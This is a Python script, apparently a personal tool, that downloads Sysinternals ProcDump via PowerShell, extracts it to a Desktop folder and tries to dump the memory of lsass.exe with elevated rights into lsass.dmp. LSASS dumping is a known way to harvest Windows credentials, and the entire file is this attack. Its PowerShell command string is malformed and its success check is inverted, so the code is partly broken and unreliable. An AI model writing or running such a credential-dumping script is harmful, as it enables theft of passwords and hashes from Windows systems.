import os
import subprocess as sp
from subprocess import DEVNULL
from zipfile import ZipFile


PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
base_dir = r"C:\\Users\\raham\\OneDrive\\Desktop\\"
path2Zip = "Procdump.zip"
os.mkdir(base_dir+"ProcDump") # make procdump dir on desktop
os.mkdir(base_dir+"Dump")
full_path = base_dir+"ProcDump" # join base_dir with new procdump folder

def procdump_exec():
    sp.call([PS, "-Command", f"Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {base_dir}Procdump.zip"] ,shell=True, text=True)
    joined_path = base_dir+path2Zip
    
    with ZipFile(joined_path, "r") as procObject:
        procObject.extractall(path=full_path)
    
    if sp.call([PS, "-Command", r"-ArgumentList @({}\\ .\procdump64.exe -accepteula -ma lsass.exe {}Dump\\lsass.dmp)) -Verb RunAs".format(full_path, base_dir)]):
    # might need later:
    # sp.call([PS, "-Command", r"{}\\.\procdump64.exe -i {}Dump".format(full_path, base_dir)], shell=True, text=True):
        print("Initialized ProcDump in Dump directory!\nAnd lsass dump completed!\n")
    else:
        print("Failed for some reason.\n")
    
    #sp.call([PS, "-Command", "-ArgumentList @(\"{}\\ .\procdump64.exe -i {}Dump)) -Verb RunAs".format(full_path, base_dir)])

procdump_exec()
